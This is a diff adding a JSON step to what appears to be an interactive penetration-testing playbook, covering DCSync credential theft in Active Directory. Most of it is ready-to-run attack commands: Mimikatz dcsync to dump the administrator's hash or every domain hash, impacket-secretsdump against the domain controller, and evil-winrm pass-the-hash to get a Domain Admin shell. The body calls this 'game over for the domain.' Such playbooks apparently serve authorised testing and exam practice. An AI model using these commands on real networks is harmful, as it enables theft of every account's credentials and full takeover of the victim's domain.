@@ -1,0 +1,14 @@
+{
+  "id": "dcsync",
+  "phase": "AD",
+  "title": "DCSync — Domain Owned",
+  "body": "DCSync dumps all domain hashes. You have replication rights — pull every account. This is game over for the domain.",
+  "cmd": "# Mimikatz DCSync (on Windows — no MSF)\n.\\mimikatz.exe \"privilege::debug\" \\\n  \"lsadump::dcsync /domain:domain.com /user:administrator\" \\\n  \"exit\"\n\n# Dump all hashes\n.\\mimikatz.exe \"privilege::debug\" \\\n  \"lsadump::dcsync /domain:domain.com /all /csv\" \\\n  \"exit\"\n\n# impacket-secretsdump (from Kali — no agent)\nimpacket-secretsdump domain/admin:'pass'@<DCIP>\nimpacket-secretsdump domain/admin@<DCIP> -hashes :NTLM_HASH\nimpacket-secretsdump domain/admin:'pass'@<DCIP> -just-dc-ntlm\n\n# PTH to DC as Administrator\nevil-winrm -i <DCIP> -u administrator -H <NTLM_HASH>",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Domain Admin shell on DC — grab proof",
+      "next": "ad_complete"
+    }
+  ]
+}
